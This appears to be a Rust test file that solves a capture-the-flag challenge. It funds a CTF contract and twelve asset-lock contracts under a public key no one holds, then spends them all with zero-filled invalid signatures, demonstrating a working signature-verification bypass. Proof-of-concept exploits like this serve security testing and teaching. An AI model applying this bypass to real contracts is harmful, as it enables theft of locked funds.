use simplicity_ctf::artifacts::ctf::CtfProgram;
use simplicity_ctf::artifacts::ctf::derived_ctf::{CtfArguments, CtfWitness};
use simplicity_ctf::artifacts::asset_lock::AssetLockProgram;
use simplicity_ctf::artifacts::asset_lock::derived_asset_lock::{AssetLockArguments, AssetLockWitness};
use simplex::transaction::{FinalTransaction, PartialInput, PartialOutput, ProgramInput, RequiredSignature};
use simplex::transaction::partial_input::IssuanceInput;

fn nonce_to_u256_bytes(nonce: u64) -> [u8; 32] {
    let mut bytes = [0u8; 32];
    bytes[24..32].copy_from_slice(&nonce.to_be_bytes());
    bytes
}

#[simplex::test]
fn test_signature_bypass(context: simplex::TestContext) -> anyhow::Result<()> {
    let signer = context.get_default_signer();
    let provider = context.get_default_provider();
    let network = context.get_network();
    
    // Create random public key that we DO NOT HAVE the private key for
    let fake_pubkey = [0x55u8; 32];

    let signer_utxos = signer.get_utxos()?;
    let mut issuance_tx = FinalTransaction::new();
    let entropy = [0x42u8; 32];

    let issuance_details = issuance_tx.add_issuance_input(
        PartialInput::new(signer_utxos[0].clone()),
        IssuanceInput::new_issuance(12, 0, entropy),
        RequiredSignature::NativeEcdsa,
    );
    let auth_asset_id = issuance_details.asset_id;

    let auth_asset_bytes: [u8; 32] = {
        use simplex::simplicityhl::elements::encode::Encodable;
        let mut buf = Vec::new();
        auth_asset_id.consensus_encode(&mut buf).unwrap();
        let mut arr = [0u8; 32];
        arr.copy_from_slice(&buf);
        arr
    };

    let mut asset_lock_programs = Vec::new();
    let mut asset_lock_scripts = Vec::new();
    for nonce in 0u64..12 {
        let mut al = AssetLockProgram::new(AssetLockArguments { owner_pubkey: fake_pubkey }).with_storage_capacity(1);
        let _ = al.set_storage_at(0, nonce_to_u256_bytes(nonce));
        let script = al.get_script_pubkey(network);
        issuance_tx.add_output(PartialOutput::new(script.clone(), 1, auth_asset_id));
        asset_lock_scripts.push(script);
        asset_lock_programs.push(al);
    }

    let ctf_args = CtfArguments {
        owner_pubkey: fake_pubkey,
        auth_asset_id: auth_asset_bytes,
    };
    let ctf_program = CtfProgram::new(ctf_args);
    let ctf_script = ctf_program.get_script_pubkey(network);
    issuance_tx.add_output(PartialOutput::new(ctf_script.clone(), 1_000_000, network.policy_asset()));

    let tx_receipt = signer.broadcast(&issuance_tx)?;
    tx_receipt.wait()?;

    let ctf_utxos = provider.fetch_scripthash_utxos(&ctf_script)?;
    let mut spend_tx = FinalTransaction::new();

    let ctf_witness = CtfWitness { signature: [0u8; 64] }; // INVALID SIGNATURE
    spend_tx.add_program_input(
        PartialInput::new(ctf_utxos[0].clone()),
        ProgramInput::new(Box::new(ctf_program.as_ref().clone()), Box::new(ctf_witness)),
        RequiredSignature::None, // DO NOT INJECT SIGNATURE
    );

    for nonce in 0u64..12 {
        let al_utxos = provider.fetch_scripthash_utxos(&asset_lock_scripts[nonce as usize])?;
        let al_witness = AssetLockWitness { signature: [0u8; 64], nonce }; // INVALID SIGNATURE
        spend_tx.add_program_input(
            PartialInput::new(al_utxos[0].clone()),
            ProgramInput::new(Box::new(asset_lock_programs[nonce as usize].as_ref().clone()), Box::new(al_witness)),
            RequiredSignature::None, // DO NOT INJECT SIGNATURE
        );
    }

    spend_tx.add_output(PartialOutput::new(signer.get_address().script_pubkey(), 12, auth_asset_id));
    
    let spend_receipt = signer.broadcast(&spend_tx)?;
    spend_receipt.wait()?;
    println!("BYPASS SUCCESSFUL!");
    
    Ok(())
}
